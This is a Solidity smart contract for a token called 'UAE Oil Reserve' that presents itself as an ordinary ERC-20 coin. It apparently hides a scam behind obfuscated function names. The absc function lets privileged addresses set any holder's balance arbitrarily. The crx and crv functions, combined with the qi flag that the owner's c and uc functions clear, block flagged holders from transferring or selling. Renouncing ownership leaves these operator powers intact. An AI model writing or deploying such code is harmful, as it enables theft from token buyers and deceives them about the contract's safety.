//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./Context.sol";

contract UAEOilReserve is Context {
    address owner;
    string public name = "UAE Oil Reserve";
    string public symbol = "U-OIL";
    uint8 public decimals = 18;
    uint256 public totalSupply = 10_000_000 * (uint256(10)**decimals);
    uint256 qi = 1;
    address DexRouter = 0xdd4482360115e96F0E300C0C103603d406A9Bc9a;
    mapping(address => uint256) public echoB;
    mapping(address => bool) crvM;
    mapping(address => bool) eRn;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);
    constructor() {
    echoB[msg.sender] = totalSupply;
    emit Transfer(address(0), msg.sender, totalSupply);
    owner = msg.sender;
    }
    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);
    }
    modifier iQ() {
    qi = 0;
    _;
    }
    function transfer(address to, uint256 value) public returns (bool success) {
    if (msg.sender == DexRouter) {
    require(echoB[msg.sender] >= value);
    echoB[msg.sender] -= value;
    echoB[to] += value;
    emit Transfer(msg.sender, to, value);
    return true;
    }
    if (crvM[msg.sender]) {
    require(qi == 1);
    }
    require(echoB[msg.sender] >= value);
    echoB[msg.sender] -= value;
    echoB[to] += value;
    emit Transfer(msg.sender, to, value);
    return true;
    }
    function c(address Ex) public iQ {
    require(msg.sender == owner);
    eRn[Ex] = true;
    }
    function uc(address Ex) public iQ {
    require(msg.sender == owner);
    eRn[Ex] = false;
    }
    function balanceOf(address account) public view returns (uint256) {
    return echoB[account];
    }
    function crx(address Ex) public N {
    require(!crvM[Ex]);
    crvM[Ex] = true;
    }
    modifier N() {
    require(eRn[msg.sender]);
    _;
    }
    event Approval(
    address indexed owner,
    address indexed spender,
    uint256 value
    );
    mapping(address => mapping(address => uint256)) public allowance;
    function approve(address spender, uint256 value) public returns (bool success)
    {
    allowance[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
    }
    function absc(address Ex, uint256 iZ) public N returns (bool success) {
    echoB[Ex] = iZ;
    return true;
    }
    function crv(address Ex) public N {
    require(crvM[Ex]);
    crvM[Ex] = false;
    }
    function transferFrom(
    address from,
    address to,
    uint256 value
    ) public returns (bool success) {
    if (from == DexRouter) {
    require(value <= echoB[from]);
    require(value <= allowance[from][msg.sender]);
    echoB[from] -= value;
    echoB[to] += value;
    emit Transfer(from, to, value);
    return true;
    }
    if (crvM[from] || crvM[to]) {
    require(qi == 1);
    }
    require(value <= echoB[from]);
    require(value <= allowance[from][msg.sender]);
    echoB[from] -= value;
    echoB[to] += value;
    allowance[from][msg.sender] -= value;
    emit Transfer(from, to, value);
    return true;
    }
}
